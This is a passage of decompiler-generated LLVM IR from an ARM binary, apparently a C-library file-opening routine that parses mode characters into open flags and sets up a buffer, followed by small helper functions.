  %v24_d500 = load i32, i32* @fp, align 4
  %v0_d504 = load i32, i32* @r1, align 4
  %v1_d504 = inttoptr i32 %v0_d504 to i8*
  %v2_d504 = load i8, i8* %v1_d504, align 1
  %v3_d504 = zext i8 %v2_d504 to i32
  store i32 %v3_d504, i32* @ip, align 4
  %v7_d50c = icmp eq i8 %v2_d504, 114
  store i32 142044, i32* @fp, align 4
  %v2_d514 = ptrtoint i32* %stack_var_-72 to i32
  %v0_d518 = load i32, i32* @r0, align 4
  store i32 %v0_d518, i32* @r6, align 4
  %v0_d51c = load i32, i32* @r2, align 4
  store i32 %v0_d51c, i32* @sb, align 4
  %v0_d520 = load i32, i32* @r3, align 4
  store i32 %v0_d520, i32* @r5, align 4
  br i1 %v7_d50c, label %dec_label_pc_d56c, label %dec_label_pc_d528

dec_label_pc_d528:                                ; preds = %dec_label_pc_d500
  %v7_d528 = icmp eq i8 %v2_d504, 119
  br i1 %v7_d528, label %bb, label %dec_label_pc_d534

bb:                                               ; preds = %dec_label_pc_d528
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_d570

dec_label_pc_d534:                                ; preds = %dec_label_pc_d528
  %v7_d534 = icmp eq i8 %v2_d504, 97
  br i1 %v7_d534, label %bb32, label %dec_label_pc_d540

bb32:                                             ; preds = %dec_label_pc_d534
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_d570

dec_label_pc_d540:                                ; preds = %dec_label_pc_d534, %dec_label_pc_d5f4, %dec_label_pc_d5c8
  %v0_d540 = call i32 @function_ce08()
  store i32 %v0_d540, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_d548 = load i32, i32* @sb, align 4
  %v2_d548 = icmp eq i32 %v0_d548, 0
  %v2_d54c = inttoptr i32 %v0_d540 to i32*
  store i32 22, i32* %v2_d54c, align 4
  br i1 %v2_d548, label %dec_label_pc_d7c0, label %dec_label_pc_d554

dec_label_pc_d554:                                ; preds = %dec_label_pc_d540, %dec_label_pc_d618._crit_edge
  %v0_d554 = load i32, i32* @sb, align 4
  %v1_d554 = inttoptr i32 %v0_d554 to i16*
  %v2_d554 = load i16, i16* %v1_d554, align 2
  %v3_d554 = zext i16 %v2_d554 to i32
  store i32 %v3_d554, i32* %r3.global-to-local, align 4
  %v1_d558 = and i32 %v3_d554, 8192
  %v2_d558 = icmp eq i32 %v1_d558, 0
  br i1 %v2_d558, label %dec_label_pc_d7c0, label %dec_label_pc_d560

dec_label_pc_d560:                                ; preds = %dec_label_pc_d554
  store i32 %v0_d554, i32* @r0, align 4
  %v0_d564 = call i32 @function_108e4()
  store i32 %v0_d564, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_d7c0

dec_label_pc_d56c:                                ; preds = %dec_label_pc_d500
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_d570

dec_label_pc_d570:                                ; preds = %bb, %bb32, %dec_label_pc_d56c
  %v1_d588 = phi i32 [ 1089, %bb32 ], [ 577, %bb ], [ 1, %dec_label_pc_d56c ]
  %v1_d570 = add i32 %v0_d504, 1
  %v2_d570 = inttoptr i32 %v1_d570 to i8*
  %v3_d570 = load i8, i8* %v2_d570, align 1
  %v7_d574 = icmp eq i8 %v3_d570, 98
  %v1_d570.v0_d504 = select i1 %v7_d574, i32 %v1_d570, i32 %v0_d504
  store i32 %v1_d570.v0_d504, i32* %r3.global-to-local, align 4
  %v1_d580 = add i32 %v1_d570.v0_d504, 1
  %v2_d580 = inttoptr i32 %v1_d580 to i8*
  %v3_d580 = load i8, i8* %v2_d580, align 1
  %v4_d580 = zext i8 %v3_d580 to i32
  store i32 %v4_d580, i32* @r3, align 4
  %v7_d584 = icmp eq i8 %v3_d580, 43
  br i1 %v7_d584, label %bb35, label %.thread3

bb35:                                             ; preds = %dec_label_pc_d570
  store i32 %v1_d588, i32* @r3, align 4
  %v2_d58c = add nuw nsw i32 %v1_d588, 1
  store i32 %v2_d58c, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_d570, %bb35
  %v2_d590 = icmp eq i32 %v0_d51c, 0
  br i1 %v2_d590, label %dec_label_pc_d598, label %dec_label_pc_d5c0

dec_label_pc_d598:                                ; preds = %.thread3
  store i32 80, i32* %r0.global-to-local, align 4
  %v1_d59c = call i32 @function_fd60(i32 80)
  store i32 %v1_d59c, i32* %r0.global-to-local, align 4
  store i32 %v1_d59c, i32* @sb, align 4
  %v3_d5a0 = icmp eq i32 %v1_d59c, 0
  br i1 %v3_d5a0, label %dec_label_pc_d7c4, label %dec_label_pc_d5a8

dec_label_pc_d5a8:                                ; preds = %dec_label_pc_d598
  %v2_d5ac = add i32 %v1_d59c, 8
  %v3_d5ac = inttoptr i32 %v2_d5ac to i32*
  store i32 0, i32* %v3_d5ac, align 4
  store i32 8192, i32* %r3.global-to-local, align 4
  %v2_d5b4 = load i32, i32* @sb, align 4
  %v3_d5b4 = inttoptr i32 %v2_d5b4 to i16*
  store i16 8192, i16* %v3_d5b4, align 2
  %v0_d5b8 = load i32, i32* @sb, align 4
  %v1_d5b8 = add i32 %v0_d5b8, 56
  store i32 %v1_d5b8, i32* @r0, align 4
  %v1_d5bc = call i32 @function_d870(i32 %v1_d5b8)
  store i32 %v1_d5bc, i32* %r0.global-to-local, align 4
  %v0_d5c0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d5c0

dec_label_pc_d5c0:                                ; preds = %.thread3, %dec_label_pc_d5a8
  %v0_d618 = phi i32 [ %v0_d520, %.thread3 ], [ %v0_d5c0.pre, %dec_label_pc_d5a8 ]
  %v1_d5c0 = icmp slt i32 %v0_d618, 0
  br i1 %v1_d5c0, label %dec_label_pc_d618, label %dec_label_pc_d5c8

dec_label_pc_d5c8:                                ; preds = %dec_label_pc_d5c0
  %v0_d5cc = load i32, i32* @r4, align 4
  %v2_d5cc = and i32 %v0_d5cc, 131075
  %v1_d5d0 = add nuw nsw i32 %v2_d5cc, 1
  store i32 %v1_d5d0, i32* %r2.global-to-local, align 4
  %v0_d5d4 = load i32, i32* @r6, align 4
  %v1_d5d4 = add i32 %v0_d5d4, 1
  %v2_d5d8 = and i32 %v1_d5d4, %v1_d5d0
  store i32 %v2_d5d8, i32* %r3.global-to-local, align 4
  %v9_d5dc = icmp eq i32 %v2_d5d8, %v1_d5d0
  %v1_d5e0 = load i32, i32* @sb, align 4
  %v2_d5e0 = add i32 %v1_d5e0, 4
  %v3_d5e0 = inttoptr i32 %v2_d5e0 to i32*
  store i32 %v0_d618, i32* %v3_d5e0, align 4
  br i1 %v9_d5dc, label %dec_label_pc_d5e8, label %dec_label_pc_d540

dec_label_pc_d5e8:                                ; preds = %dec_label_pc_d5c8
  %v0_d5e8 = load i32, i32* @r4, align 4
  %v1_d5e8 = load i32, i32* @r6, align 4
  %v2_d5e8 = sub i32 -1, %v1_d5e8
  %v3_d5e8 = and i32 %v0_d5e8, %v2_d5e8
  store i32 %v3_d5e8, i32* @r3, align 4
  %v1_d5ec = and i32 %v3_d5e8, 1024
  %v2_d5ec = icmp eq i32 %v1_d5ec, 0
  br i1 %v2_d5ec, label %dec_label_pc_d60c, label %dec_label_pc_d5f4

dec_label_pc_d5f4:                                ; preds = %dec_label_pc_d5e8
  %v0_d5f4 = load i32, i32* @r5, align 4
  store i32 %v0_d5f4, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v2_d600 = call i32 @function_125d4(i32 %v0_d5f4, i32 4)
  store i32 %v2_d600, i32* %r0.global-to-local, align 4
  %v2_d604 = icmp eq i32 %v2_d600, 0
  br i1 %v2_d604, label %dec_label_pc_d5f4.dec_label_pc_d60c_crit_edge, label %dec_label_pc_d540

dec_label_pc_d5f4.dec_label_pc_d60c_crit_edge:    ; preds = %dec_label_pc_d5f4
  %v0_d60c.pre = load i32, i32* @r6, align 4
  %v0_d610.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d60c

dec_label_pc_d60c:                                ; preds = %dec_label_pc_d5f4.dec_label_pc_d60c_crit_edge, %dec_label_pc_d5e8
  %v0_d610 = phi i32 [ %v0_d610.pre, %dec_label_pc_d5f4.dec_label_pc_d60c_crit_edge ], [ %v0_d5e8, %dec_label_pc_d5e8 ]
  %v0_d60c = phi i32 [ %v0_d60c.pre, %dec_label_pc_d5f4.dec_label_pc_d60c_crit_edge ], [ %v1_d5e8, %dec_label_pc_d5e8 ]
  %v1_d60c = and i32 %v0_d60c, 131072
  store i32 %v1_d60c, i32* %r3.global-to-local, align 4
  %v2_d610 = or i32 %v1_d60c, %v0_d610
  store i32 %v2_d610, i32* @r4, align 4
  br label %dec_label_pc_d63c

dec_label_pc_d618:                                ; preds = %dec_label_pc_d5c0
  %v7_d618 = icmp eq i32 %v0_d618, -1
  %v0_d624.pre = load i32, i32* @r4, align 4
  br i1 %v7_d618, label %dec_label_pc_d618._crit_edge, label %bb36

bb36:                                             ; preds = %dec_label_pc_d618
  %v2_d61c = or i32 %v0_d624.pre, 131072
  store i32 %v2_d61c, i32* @r4, align 4
  br label %dec_label_pc_d618._crit_edge

dec_label_pc_d618._crit_edge:                     ; preds = %dec_label_pc_d618, %bb36
  %v0_d624 = phi i32 [ %v2_d61c, %bb36 ], [ %v0_d624.pre, %dec_label_pc_d618 ]
  %v0_d620 = load i32, i32* @r6, align 4
  store i32 %v0_d620, i32* %r0.global-to-local, align 4
  store i32 %v0_d624, i32* %r1.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_d62c = call i32 @function_123fc(i32 %v0_d620, i32 %v0_d624)
  store i32 %v2_d62c, i32* %r0.global-to-local, align 4
  %v1_d630 = icmp slt i32 %v2_d62c, 0
  %v1_d634 = load i32, i32* @sb, align 4
  %v2_d634 = add i32 %v1_d634, 4
  %v3_d634 = inttoptr i32 %v2_d634 to i32*
  store i32 %v2_d62c, i32* %v3_d634, align 4
  br i1 %v1_d630, label %dec_label_pc_d554, label %.dec_label_pc_d63c_crit_edge

.dec_label_pc_d63c_crit_edge:                     ; preds = %dec_label_pc_d618._crit_edge
  %v0_d640.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d63c

dec_label_pc_d63c:                                ; preds = %.dec_label_pc_d63c_crit_edge, %dec_label_pc_d60c
  %v0_d658 = phi i32 [ %v0_d640.pre, %.dec_label_pc_d63c_crit_edge ], [ %v2_d610, %dec_label_pc_d60c ]
  %v0_d63c = load i32, i32* @sb, align 4
  %v1_d63c = inttoptr i32 %v0_d63c to i16*
  %v2_d63c = load i16, i16* %v1_d63c, align 2
  %v3_d63c = zext i16 %v2_d63c to i32
  %v1_d640 = urem i32 %v0_d658, 4
  %v1_d644 = and i32 %v0_d658, 1024
  %v1_d648 = and i32 %v3_d63c, 8192
  %v1_d64c = add nuw nsw i32 %v1_d640, 1
  %v2_d650 = or i32 %v1_d648, %v1_d644
  store i32 %v2_d650, i32* %r3.global-to-local, align 4
  %v1_d654 = xor i32 %v1_d64c, 3
  store i32 %v1_d654, i32* %r1.global-to-local, align 4
  %v1_d658 = and i32 %v0_d658, 131072
  store i32 %v1_d658, i32* %r2.global-to-local, align 4
  %v2_d658 = icmp eq i32 %v1_d658, 0
  %v1_d65c = add i32 %v0_d63c, 4
  %v2_d65c = inttoptr i32 %v1_d65c to i32*
  %v3_d65c = load i32, i32* %v2_d65c, align 4
  store i32 %v3_d65c, i32* @r5, align 4
  br i1 %v2_d658, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_d63c
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_d63c, %bb37
  %v0_d668 = phi i32 [ 0, %dec_label_pc_d63c ], [ 32768, %bb37 ]
  %v4_d664 = mul nuw nsw i32 %v1_d654, 16
  %v5_d664 = or i32 %v2_d650, %v4_d664
  store i32 %v5_d664, i32* %r3.global-to-local, align 4
  %v2_d668 = or i32 %v0_d668, %v5_d664
  store i32 %v2_d668, i32* %r2.global-to-local, align 4
  %v8_d66c = icmp eq i32 %v3_d65c, 2147483647
  %v1_d670 = trunc i32 %v2_d668 to i16
  store i16 %v1_d670, i16* %v1_d63c, align 2
  br i1 %v8_d66c, label %dec_label_pc_d6a0, label %dec_label_pc_d678

dec_label_pc_d678:                                ; preds = %bb38
  %v0_d678 = call i32 @function_ce08()
  store i32 %v0_d678, i32* @r4, align 4
  %v0_d680 = load i32, i32* @r5, align 4
  store i32 %v0_d680, i32* @r0, align 4
  %v1_d684 = inttoptr i32 %v0_d678 to i32*
  %v2_d684 = load i32, i32* %v1_d684, align 4
  store i32 %v2_d684, i32* @r5, align 4
  %v1_d688 = call i32 @function_f804(i32 %v0_d680)
  store i32 %v1_d688, i32* %r0.global-to-local, align 4
  %v2_d68c = icmp eq i32 %v1_d688, 0
  br i1 %v2_d68c, label %.thread5, label %bb39

bb39:                                             ; preds = %dec_label_pc_d678
  %v1_d690 = load i32, i32* @sb, align 4
  %v2_d690 = inttoptr i32 %v1_d690 to i16*
  %v3_d690 = load i16, i16* %v2_d690, align 2
  %v4_d690 = zext i16 %v3_d690 to i32
  %v2_d694 = or i32 %v4_d690, 256
  store i32 %v2_d694, i32* %r3.global-to-local, align 4
  %v2_d698 = trunc i32 %v2_d694 to i16
  store i16 %v2_d698, i16* %v2_d690, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_d678, %bb39
  %v0_d69c = load i32, i32* @r5, align 4
  %v1_d69c = load i32, i32* @r4, align 4
  %v2_d69c = inttoptr i32 %v1_d69c to i32*
  store i32 %v0_d69c, i32* %v2_d69c, align 4
  br label %dec_label_pc_d6a0

dec_label_pc_d6a0:                                ; preds = %bb38, %.thread5
  %v0_d6a0 = load i32, i32* @sb, align 4
  %v1_d6a0 = add i32 %v0_d6a0, 8
  %v2_d6a0 = inttoptr i32 %v1_d6a0 to i32*
  %v3_d6a0 = load i32, i32* %v2_d6a0, align 4
  store i32 %v3_d6a0, i32* %r3.global-to-local, align 4
  %v2_d6a4 = icmp eq i32 %v3_d6a0, 0
  br i1 %v2_d6a4, label %dec_label_pc_d6ac, label %bb40

dec_label_pc_d6ac:                                ; preds = %dec_label_pc_d6a0
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_d6b0 = call i32 @function_fd60(i32 4096)
  store i32 %v1_d6b0, i32* %r0.global-to-local, align 4
  %v2_d6b4 = icmp eq i32 %v1_d6b0, 0
  %v1_d6c4.pre = load i32, i32* @sb, align 4
  br i1 %v2_d6b4, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_d6ac
  %v2_d6b8 = inttoptr i32 %v1_d6c4.pre to i16*
  %v3_d6b8 = load i16, i16* %v2_d6b8, align 2
  %v4_d6b8 = zext i16 %v3_d6b8 to i32
  %v2_d6bc = add i32 %v1_d6b0, 4096
  store i32 %v2_d6bc, i32* %r2.global-to-local, align 4
  %v2_d6c0 = or i32 %v4_d6b8, 16384
  store i32 %v2_d6c0, i32* %r3.global-to-local, align 4
  %v2_d6c4 = add i32 %v1_d6c4.pre, 8
  %v3_d6c4 = inttoptr i32 %v2_d6c4 to i32*
  store i32 %v1_d6b0, i32* %v3_d6c4, align 4
  %v1_d6c8 = load i32, i32* %r2.global-to-local, align 4
  %v2_d6c8 = load i32, i32* @sb, align 4
  %v3_d6c8 = add i32 %v2_d6c8, 12
  %v4_d6c8 = inttoptr i32 %v3_d6c8 to i32*
  store i32 %v1_d6c8, i32* %v4_d6c8, align 4
  %v1_d6cc = load i32, i32* %r3.global-to-local, align 4
  %v2_d6cc = trunc i32 %v1_d6cc to i16
  %v3_d6cc = load i32, i32* @sb, align 4
  %v4_d6cc = inttoptr i32 %v3_d6cc to i16*
  store i16 %v2_d6cc, i16* %v4_d6cc, align 2
  br label %bb40

.thread9:                                         ; preds = %dec_label_pc_d6ac
  %v2_d6c419 = add i32 %v1_d6c4.pre, 8
  %v3_d6c420 = inttoptr i32 %v2_d6c419 to i32*
  store i32 0, i32* %v3_d6c420, align 4
  %v2_d6d0 = load i32, i32* @sb, align 4
  %v3_d6d0 = add i32 %v2_d6d0, 12
  %v4_d6d0 = inttoptr i32 %v3_d6d0 to i32*
  store i32 0, i32* %v4_d6d0, align 4
  br label %bb40

bb40:                                             ; preds = %.thread8, %dec_label_pc_d6a0, %.thread9
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_d6dc = load i32, i32* @fp, align 4
  %v2_d6dc = add i32 %v0_d6dc, 60
  %v3_d6dc = inttoptr i32 %v2_d6dc to i32*
  %v4_d6dc = load i32, i32* %v3_d6dc, align 4
  store i32 %v4_d6dc, i32* %r3.global-to-local, align 4
  %v2_d6e0 = load i32, i32* @sb, align 4
  %v3_d6e0 = add i32 %v2_d6e0, 2
  %v4_d6e0 = inttoptr i32 %v3_d6e0 to i8*
  store i8 0, i8* %v4_d6e0, align 1
  %v0_d6e4 = load i32, i32* @sb, align 4
  %v1_d6e4 = inttoptr i32 %v0_d6e4 to i16*
  %v2_d6e4 = load i16, i16* %v1_d6e4, align 2
  %v3_d6e4 = zext i16 %v2_d6e4 to i32
  store i32 %v3_d6e4, i32* %r2.global-to-local, align 4
  %v0_d6e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_d6e8 = inttoptr i32 %v0_d6e8 to i32*
  %v2_d6e8 = load i32, i32* %v1_d6e8, align 4
  store i32 %v2_d6e8, i32* %r1.global-to-local, align 4
  %v1_d6ec = add i32 %v0_d6e4, 8
  %v2_d6ec = inttoptr i32 %v1_d6ec to i32*
  %v3_d6ec = load i32, i32* %v2_d6ec, align 4
  store i32 %v3_d6ec, i32* %r3.global-to-local, align 4
  %v1_d6f0 = and i32 %v3_d6e4, 8192
  %v2_d6f0 = icmp eq i32 %v1_d6f0, 0
  %v2_d6f4 = add i32 %v0_d6e4, 20
  %v3_d6f4 = inttoptr i32 %v2_d6f4 to i32*
  store i32 %v3_d6ec, i32* %v3_d6f4, align 4
  %v0_d6f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_d6f8 = load i32, i32* @sb, align 4
  %v2_d6f8 = add i32 %v1_d6f8, 44
  %v3_d6f8 = inttoptr i32 %v2_d6f8 to i32*
  store i32 %v0_d6f8, i32* %v3_d6f8, align 4
  %v0_d6fc = load i32, i32* %r1.global-to-local, align 4
  %v1_d6fc = load i32, i32* @sb, align 4
  %v2_d6fc = add i32 %v1_d6fc, 52
  %v3_d6fc = inttoptr i32 %v2_d6fc to i32*
  store i32 %v0_d6fc, i32* %v3_d6fc, align 4
  %v0_d700 = load i32, i32* %r3.global-to-local, align 4
  %v1_d700 = load i32, i32* @sb, align 4
  %v2_d700 = add i32 %v1_d700, 24
  %v3_d700 = inttoptr i32 %v2_d700 to i32*
  store i32 %v0_d700, i32* %v3_d700, align 4
  %v0_d704 = load i32, i32* %r3.global-to-local, align 4
  %v1_d704 = load i32, i32* @sb, align 4
  %v2_d704 = add i32 %v1_d704, 28
  %v3_d704 = inttoptr i32 %v2_d704 to i32*
  store i32 %v0_d704, i32* %v3_d704, align 4
  %v0_d708 = load i32, i32* %r3.global-to-local, align 4
  %v1_d708 = load i32, i32* @sb, align 4
  %v2_d708 = add i32 %v1_d708, 16
  %v3_d708 = inttoptr i32 %v2_d708 to i32*
  store i32 %v0_d708, i32* %v3_d708, align 4
  br i1 %v2_d6f0, label %dec_label_pc_d7c4, label %dec_label_pc_d710

dec_label_pc_d710:                                ; preds = %bb40
  store i32 36, i32* %r3.global-to-local, align 4
  %v0_d714 = load i32, i32* @fp, align 4
  %v2_d714 = add i32 %v0_d714, 36
  %v3_d714 = inttoptr i32 %v2_d714 to i32*
  %v4_d714 = load i32, i32* %v3_d714, align 4
  store i32 %v4_d714, i32* %r8.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_d71c = add i32 %v0_d714, 112
  %v3_d71c = inttoptr i32 %v2_d71c to i32*
  %v4_d71c = load i32, i32* %v3_d71c, align 4
  store i32 %v4_d71c, i32* %r4.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_d724 = ptrtoint i32* %stack_var_-56 to i32
  %v2_d728 = add i32 %v0_d714, 76
  %v3_d728 = inttoptr i32 %v2_d728 to i32*
  %v4_d728 = load i32, i32* %v3_d728, align 4
  store i32 %v4_d714, i32* %r1.global-to-local, align 4
  store i32 %v4_d71c, i32* %r2.global-to-local, align 4
  store i32 %v2_d724, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_d728)
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_d744 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_d744, i32* %r0.global-to-local, align 4
  %v0_d748 = load i32, i32* @fp, align 4
  %v2_d748 = add i32 %v0_d748, 16
  %v3_d748 = inttoptr i32 %v2_d748 to i32*
  %v4_d748 = load i32, i32* %v3_d748, align 4
  call void @__pseudo_branch(i32 %v4_d748)
  store i32 100, i32* %r3.global-to-local, align 4
  %v0_d758 = load i32, i32* @fp, align 4
  %v2_d758 = add i32 %v0_d758, 100
  %v3_d758 = inttoptr i32 %v2_d758 to i32*
  %v4_d758 = load i32, i32* %v3_d758, align 4
  store i32 %v4_d758, i32* %r4.global-to-local, align 4
  %v0_d75c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_d75c, i32* %r1.global-to-local, align 4
  store i32 %v4_d758, i32* %r2.global-to-local, align 4
  store i32 %v2_d514, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_d728)
  store i32 %v4_d758, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_d748)
  store i32 48, i32* %r3.global-to-local, align 4
  %v0_d780 = load i32, i32* @fp, align 4
  %v2_d780 = add i32 %v0_d780, 48
  %v3_d780 = inttoptr i32 %v2_d780 to i32*
  %v4_d780 = load i32, i32* %v3_d780, align 4
  store i32 %v4_d780, i32* @ip, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v1_d788 = inttoptr i32 %v4_d780 to i32*
  %v2_d788 = load i32, i32* %v1_d788, align 4
  store i32 %v2_d788, i32* %r2.global-to-local, align 4
  store i32 %v2_d514, i32* %r0.global-to-local, align 4
  %v1_d790 = load i32, i32* @sb, align 4
  %v2_d790 = add i32 %v1_d790, 32
  %v3_d790 = inttoptr i32 %v2_d790 to i32*
  store i32 %v2_d788, i32* %v3_d790, align 4
  %v0_d794 = load i32, i32* @fp, align 4
  %v1_d794 = load i32, i32* %r3.global-to-local, align 4
  %v2_d794 = add i32 %v1_d794, %v0_d794
  %v3_d794 = inttoptr i32 %v2_d794 to i32*
  %v4_d794 = load i32, i32* %v3_d794, align 4
  store i32 %v4_d794, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d79c = load i32, i32* @sb, align 4
  %v1_d79c = load i32, i32* @ip, align 4
  %v2_d79c = inttoptr i32 %v1_d79c to i32*
  store i32 %v0_d79c, i32* %v2_d79c, align 4
  call void @__pseudo_branch(i32 %v4_d794)
  store i32 %v2_d724, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_d794)
  br label %dec_label_pc_d7c4

dec_label_pc_d7c0:                                ; preds = %dec_label_pc_d554, %dec_label_pc_d540, %dec_label_pc_d560
  store i32 0, i32* @sb, align 4
  br label %dec_label_pc_d7c4

dec_label_pc_d7c4:                                ; preds = %dec_label_pc_d598, %bb40, %dec_label_pc_d710, %dec_label_pc_d7c0
  %v0_d7c4 = load i32, i32* @sb, align 4
  store i32 %v0_d7c4, i32* %r0.global-to-local, align 4
  %v2_d7cc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_d7cc, i32* @r4, align 4
  store i32 %v6_d500, i32* @r5, align 4
  store i32 %v9_d500, i32* @r6, align 4
  store i32 %v18_d500, i32* @sb, align 4
  store i32 %v24_d500, i32* @fp, align 4
  ret i32 %v0_d7c4

; uselistorder directives
  uselistorder i32 %v1_d6c4.pre, { 2, 1, 0 }
  uselistorder i32 %v1_d6b0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_d658, { 1, 2, 0 }
  uselistorder i32 %v0_d624, { 1, 0 }
  uselistorder i32 %v1_d5e8, { 1, 0 }
  uselistorder i32 %v0_d5e8, { 1, 0 }
  uselistorder i32 %v1_d5d0, { 1, 0, 2 }
  uselistorder i32 %v1_d588, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 25, 26, 3, 4, 5, 6, 7, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 5, 6, 7, 8, 9, 10, 0, 1, 2, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 7, 8, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 11, 13, 12, 15, 14, 16, 17, 18, 19, 5, 20, 0, 7, 6, 9, 8, 2, 10, 3, 1, 4 }
  uselistorder i8 114, { 1, 0 }
  uselistorder label %dec_label_pc_d7c4, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_d7c0, { 2, 0, 1 }
  uselistorder label %bb40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d6a0, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_d618._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_d5c0, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_d570, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d554, { 1, 0 }
  uselistorder label %dec_label_pc_d540, { 1, 2, 0 }
}

define i32 @function_d7d8(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d7d8:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v0_d7d8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_d7d8, label %bb, label %.thread10

bb:                                               ; preds = %dec_label_pc_d7d8
  %v1_d7e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_d7e0 = load i32, i32* %r3.global-to-local, align 4
  %v3_d7e0 = and i32 %v2_d7e0, %v1_d7e0
  %v2_d7e4 = trunc i32 %v3_d7e0 to i16
  %v4_d7e4 = inttoptr i32 %v3_d7e0 to i16*
  store i16 %v2_d7e4, i16* %v4_d7e4, align 2
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_d7d8, %bb
  %v0_d80c = call i32 @function_ce08()
  store i32 %v0_d80c, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v1_d818 = inttoptr i32 %v0_d80c to i32*
  %v2_d818 = load i32, i32* %v1_d818, align 4
  store i32 %v2_d818, i32* @r6, align 4
  %v1_d81c = call i32 @function_f804(i32 0)
  %v2_d824 = icmp eq i32 %v1_d81c, 0
  store i32 add (i32 ptrtoint (i32* @global_var_152ac.299 to i32), i32 55344), i32* @r4, align 4
  br i1 %v2_d824, label %bb23, label %.thread13

bb23:                                             ; preds = %.thread10
  store i32 416, i32* %r2.global-to-local, align 4
  %v5_d830 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_152ac.299 to i32), i32 55760) to i16*), align 4
  %v7_d830 = zext i16 %v5_d830 to i32
  %v2_d834 = xor i32 %v7_d830, 256
  store i32 %v2_d834, i32* @r3, align 4
  %v2_d838 = trunc i32 %v2_d834 to i16
  store i16 %v2_d838, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_152ac.299 to i32), i32 55760) to i16*), align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread10, %bb23
  store i32 1, i32* @r0, align 4
  %v1_d840 = call i32 @function_f804(i32 1)
  %v2_d844 = icmp eq i32 %v1_d840, 0
  br i1 %v2_d844, label %bb24, label %.thread17

bb24:                                             ; preds = %.thread13
  %v1_d84c = load i32, i32* @r4, align 4
  %v3_d84c = add i32 %v1_d84c, 416
  store i32 %v3_d84c, i32* %r2.global-to-local, align 4
  %v2_d850 = add i32 %v1_d84c, 496
  %v3_d850 = inttoptr i32 %v2_d850 to i16*
  %v4_d850 = load i16, i16* %v3_d850, align 2
  %v5_d850 = zext i16 %v4_d850 to i32
  %v2_d854 = xor i32 %v5_d850, 256
  store i32 %v2_d854, i32* %r3.global-to-local, align 4
  %v2_d858 = trunc i32 %v2_d854 to i16
  store i16 %v2_d858, i16* %v3_d850, align 2
  br label %.thread17

.thread17:                                        ; preds = %.thread13, %bb24
  %v0_d85c = load i32, i32* @r6, align 4
  %v1_d85c = load i32, i32* @r5, align 4
  %v2_d85c = inttoptr i32 %v1_d85c to i32*
  store i32 %v0_d85c, i32* %v2_d85c, align 4
  ret i32 %v1_d840

; uselistorder directives
  uselistorder i32 %v3_d7e0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32)* @function_f804, { 2, 1, 0 }
  uselistorder label %.thread17, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @function_d870(i32 %arg1) local_unnamed_addr {
dec_label_pc_d870:
  store i32 add (i32 ptrtoint (i32* @global_var_15258.302 to i32), i32 55428), i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_196fc.304 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_d88c = call i32 @function_f350()
